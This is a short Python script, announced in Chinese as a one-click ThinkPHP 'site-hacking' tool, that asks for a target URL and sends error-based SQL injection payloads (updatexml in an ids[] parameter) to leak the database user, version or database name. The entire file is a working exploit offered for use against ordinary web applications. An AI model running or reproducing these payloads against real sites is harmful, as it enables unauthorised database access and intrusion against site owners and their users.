#!/usr/bin/python
# -*- coding: UTF-8 -*-
import requests
import sys
import re
from lxml import etree

print('欢迎使用thinkphp一键日站工具，作者:kurokoleung')
print('如果要查看用户，输入user，查看版本，输入version,查看数据库名，输入database')
url = input('请输入站点url:')
options = input('请输入选项:')

if(options == "user"):
  #payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and(updatexml(1,concat(0x7e,(select%20user())),0))"
  payload = "/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
elif(options == "version"):
  #payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and(updatexml(1,concat(0x7e,(select%20version())),0))"
  payload = "/index.php?ids[0,updatexml(0,concat(0xa,version()),0)]=1"
elif(options == "database"):
  #payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and(updatexml(1,concat(0x7e,(select%20database())),0))"
  payload = "/index.php?ids[0,updatexml(0,concat(0xa,database()),0)]=1"
else:
  print('Invalid options')
  print(options)
  sys.exit(-1)

def Poc(url,options):
  url = url + payload
  req = requests.get(url,timeout=5)
  r=(req.text)
  _element = etree.HTML(r)
  text = _element.xpath('//h1/text()')
  print(text)
  print(payload)

Poc(url,options)